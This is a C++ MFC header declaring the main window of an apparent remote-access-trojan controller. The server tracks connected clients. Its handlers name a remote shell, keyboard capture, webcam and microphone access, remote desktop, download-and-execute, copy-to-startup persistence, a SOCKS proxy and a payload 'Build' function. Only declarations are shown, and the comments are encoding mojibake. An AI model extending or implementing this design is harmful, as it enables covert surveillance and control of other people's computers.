
// MainFrm.h : CMainFrame ��Ľӿ�
//

#pragma once
#include "ClientList.h"
#include "Config.h"

#define VIEW_SHOW_CLIENLIST	1
#define VIEW_SHOE_LOG		2

#define SRV_STATU_STARTING	0			//���ڿ���
#define SRV_STATU_STARTED	1			//�Ѿ�����
#define SRV_STATU_STOPPING	2			//���ڹر�
#define SRV_STATU_STOPPED	3			//�Ѿ��ر�


class CIOCP;
class CServer;

class CMainFrame : public CFrameWnd
{
public:
	CMainFrame(CIOCP *Iocp);

	
protected: 
	DECLARE_DYNAMIC(CMainFrame)

// ����
public:

// ����
public:

// ��д
public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
// ʵ��
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

private:  // �ؼ���Ƕ���Ա
	CStatusBar        m_wndStatusBar;
	////��־
	//CFont			  m_LogFont;
	//CEdit			  m_Log;
	//�ͻ��б�
	CClientList		  m_ClientList;

	DWORD			  m_View;
	DWORD			  m_ServerStatu;
	////
	CIOCP*			  m_Iocp;
	CServer *	      m_pServer;
	
	CConfig			  m_config;
	//
	unsigned int	  m_listenPort;
// ���ɵ���Ϣӳ�亯��
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSetFocus(CWnd *pOldWnd);
	DECLARE_MESSAGE_MAP()

	//void Log(CString text);
public:
	CConfig& Config(){
		return m_config;
	}
	afx_msg void OnPaint();

	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnMainStartserver();
	afx_msg void OnUpdateMainStartserver(CCmdUI *pCmdUI);

	afx_msg void OnUpdateStatuBar();

	////�����������͹رպ��֪ͨ�ô���
	//afx_msg LRESULT OnSrvStarted(WPARAM wResult, LPARAM lNoUsed);
	//afx_msg LRESULT OnSrvStopped(WPARAM wNoUsed, LPARAM lNoUsed);

	//����socket���ӵ�ʱ��ͨ���ú�������ʼ��Handler
	afx_msg LRESULT OnClientLogin(WPARAM wParam,LPARAM lParam);

	afx_msg void OnClose();
	afx_msg void OnMainExit();
	//Control:
	afx_msg void OnSessionDisconnect();
	afx_msg void OnSessionUninstall();
	afx_msg void OnPowerShutdown();
	afx_msg void OnPowerReboot();
	afx_msg void OnOperationEditcomment();

	afx_msg void OnUpdateMainExit(CCmdUI *pCmdUI);
	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();


	afx_msg void OnMainBuild();
	afx_msg void OnMainSettings();
	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
	afx_msg void OnUtilsOpenwebpage();
	afx_msg void OnSize(UINT nType, int cx, int cy);



	afx_msg void OnOperationProcessmanager();
	afx_msg void OnRemotedesktopDxgi();
	afx_msg void OnRemotedesktopGdi();
};


